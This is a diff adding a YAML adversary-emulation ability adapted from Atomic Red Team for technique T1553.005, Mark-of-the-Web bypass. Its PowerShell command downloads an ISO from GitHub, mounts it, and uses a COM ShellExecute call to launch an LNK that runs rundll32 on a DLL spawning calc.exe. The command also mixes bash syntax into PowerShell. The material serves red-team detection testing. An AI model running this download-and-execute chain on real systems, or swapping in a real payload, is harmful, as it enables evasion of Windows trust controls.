@@ -1,0 +1,55 @@
+- id: c2587b8d-743d-4985-aa50-c83394eaeb68
+  name: Execute LNK file from ISO
+  description: Executes LNK file document.lnk from AllTheThings.iso. Link file executes
+    cmd.exe and rundll32 to in order to load and execute AllTheThingsx64.dll from
+    the ISO which spawns calc.exe.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1553.005
+    name: 'Subvert Trust Controls: Mark-of-the-Web Bypass'
+  platforms:
+    windows:
+      psh:
+        command: 'if (Test-Path "PathToAtomicsFolder\T1553.005\bin\AllTheThings.iso")
+          {exit 0} else {exit 1}; then : ; else New-Item -Type Directory (split-path
+          "PathToAtomicsFolder\T1553.005\bin\AllTheThings.iso") -ErrorAction ignore
+          | Out-Null; Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1553.005/bin/AllTheThings.iso
+          -OutFile "PathToAtomicsFolder\T1553.005\bin\AllTheThings.iso"; fi; Mount-DiskImage
+          -ImagePath "PathToAtomicsFolder\T1553.005\bin\AllTheThings.iso" -StorageType
+          ISO -Access ReadOnly; $keep = Get-Volume -FileSystemLabel "AllTheThings";
+          $driveLetter = ($keep | Get-Volume).DriveLetter; $instance = [activator]::CreateInstance([type]::GetTypeFromCLSID("{c08afd90-f2a1-11d1-8455-00a0c91f3880}"));
+          $instance.Document.Application.ShellExecute($driveLetter+":\document.lnk","",$driveLetter+":\",$null,0)'
+        cleanup: Dismount-DiskImage -ImagePath "#{path_of_iso}" | Out-Null
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1553.005
+  - atomic-red-team
+  - defense-evasion
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      path_of_iso:
+        description: Path to ISO file
+        type: path
+        default: PathToAtomicsFolder\T1553.005\bin\AllTheThings.iso
+    dependencies:
+    - description: 'AllTheThings.iso must exist on disk at specified location (#{path_of_iso})
+
+        '
+      prereq_command: 'if (Test-Path "#{path_of_iso}") {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: 'New-Item -Type Directory (split-path "#{path_of_iso}")
+        -ErrorAction ignore | Out-Null
+
+        Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1553.005/bin/AllTheThings.iso
+        -OutFile "#{path_of_iso}"
+
+        '
+    technique_created: '2021-02-22T14:20:31.650Z'
+    atomic_guid: c2587b8d-743d-4985-aa50-c83394eaeb68
+    import_timestamp: '2025-06-24T11:15:00.835958Z'
